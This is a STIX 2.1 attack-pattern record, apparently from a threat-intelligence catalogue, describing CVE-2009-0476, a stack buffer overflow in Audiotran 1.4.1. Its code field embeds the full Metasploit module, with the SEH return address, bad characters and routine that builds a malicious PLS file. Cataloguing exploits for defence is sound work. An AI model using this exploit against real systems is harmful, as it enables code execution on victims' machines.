{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--da490783-7d9b-4ba2-9a58-6fddbba70685",
    "created": "2024-08-14T16:37:53.257901Z",
    "modified": "2024-08-14T16:37:53.257905Z",
    "name": "Audiotran 1.4.1 (PLS File) Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in Audiotran 1.4.1. An attacker must send the file to victim and the victim must open the file. Alternatively it may be possible to execute code remotely via an embedded PLS file within a browser, when the PLS extension is registered to Audiotran. This functionality has not been tested in this module.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/audiotran_pls.rb",
            "external_id": "audiotran_pls.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0476"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Audiotran 1.4.1 (PLS File) Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in Audiotran 1.4.1.\n        An attacker must send the file to victim and the victim must open the file.\n        Alternatively it may be possible to execute code remotely via an embedded\n        PLS file within a browser, when the PLS extension is registered to Audiotran.\n        This functionality has not been tested in this module.\n      },\n      'License'        => MSF_LICENSE,\n      'Author' \t =>\n        [\n          'Sebastien Duquette',\n          'dookie',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0476'],\n          [ 'OSVDB', '55424'],\n          [ 'EDB', '11079' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 6000,\n          'BadChars' => \"\\x00\\x0a\\x3d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x10101A3E } ], #p/p/r in rsaadjd.tmp\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-01-09',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),\n        ])\n\n  end\n\n  def exploit\n\n    sploit = rand_text_alpha_upper(1308)\n    sploit << generate_seh_payload(target.ret)\n    sploit << rand_text_alpha_upper(8000)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-01-09",
    "x_mitre_platforms": [
        "win'"
    ]
}